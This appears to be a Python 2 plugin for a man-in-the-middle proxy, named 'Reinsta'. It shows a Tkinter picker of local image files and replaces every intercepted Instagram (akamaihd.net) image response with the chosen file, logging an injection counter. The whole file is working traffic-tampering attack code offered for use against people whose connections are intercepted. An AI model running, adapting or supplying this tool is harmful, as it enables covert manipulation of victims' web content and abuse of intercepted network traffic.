from plugins.plugin import Plugin
import os
from sys import exit

import easygui
from glob import glob

from Tkinter import *
from threading import Thread

from PIL import ImageTk, Image




def GetImagesFiles():
	files = glob('/*/*.jpg') #root
	files += glob('/*/**/*.jpg')
	files += glob('/*/**/*.png')
	files += glob('/*/**/*.jpeg')
	return files

file_choice = ""
gmaster = ""


class FormList:


    def __init__(self, master):
        self.master = master
        self.frame = Frame(self.master, width = 200)
	self.master.wm_title("Reinsta Gui")
	self.master.minsize(width=333, height=333) #width=666, height=333
		
	self.listbox = Listbox(self.frame)
	self.listbox.pack(fill=BOTH, expand=True)

	global gmaster
	gmaster = self.master

	self.listbox.insert(0, "None")
		
	for filename in GetImagesFiles():
		self.listbox.insert(END, filename)
		
		
		
	
	self.img = None #ImageTk.PhotoImage(Image.open(""))
	self.panel = Label(self.frame, image = self.img)
	self.panel.pack(side = "bottom", fill=BOTH, expand=True)

		
        self.frame.pack(fill=BOTH, expand=True)

	def on_select(event):
			selection = event.widget.curselection()
			value = event.widget.get(selection[0])
			value = str(value)

			
			global file_choice
			file_choice = value
			if (os.path.isfile(file_choice) is True): #Img found
				self.img = ImageTk.PhotoImage(Image.open(file_choice))
				self.panel.configure(image = self.img)
				
				self.panel.pack(); #'none' cancel plugin to edit data cause 'none' is not a file 
			else:
				self.panel.pack_forget() 
				
					
	self.listbox.bind('<<ListboxSelect>>', on_select)
	
	def on_exit():
		self.master.destroy()
		#os._exit(0)
		
	self.master.protocol( "WM_DELETE_WINDOW", on_exit )	



def main(): 
    root = Tk()
    app = FormList(root)
    root.mainloop()

	
	
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'


class Replace(Plugin):
    name       = "Reinsta"
    optname    = "reinsta"
    desc       = "Instagram image replace"
    version    = "0.9.1"
    tree_info = ["Replace all images on instagram, By Avr.amit", "New Gui interface", bcolors.HEADER + "Color text suppert" + bcolors.ENDC ]



	
    def initialize(self, options):

	
	GuiInterface = Thread(target=main, args=[])
	GuiInterface.start()
	
	self.InjectCounter = 0
		
	
	#akamaihd.net need to add filter
    def responseheaders(self, response, request):
	if ('akamaihd.net' in response.uri):
	        if request.isImageRequest:
	            request.isImageRequest = False
	            request.isImage = True


    def response(self, response, request, data):
        try:
            isImage = getattr(request, 'isImage')
        except AttributeError:
            isImage = False
        
        if isImage:
            try:	
		if (os.path.isfile(file_choice) is True): #if  found 
			file = open(file_choice, 'r')
			data = file.read()
		
			self.clientlog.info(bcolors.OKGREEN + "Image Injected" + bcolors.ENDC, extra=request.clientInfo)
		
			self.InjectCounter += 1
			gmaster.wm_title("Reinsta Gui - Injections counter [" + str(self.InjectCounter) + "]")
			


            except Exception as e:
                self.clientlog.info("Error: {}".format(e), extra=request.clientInfo)
    
        return {'response': response, 'request': request, 'data': data}
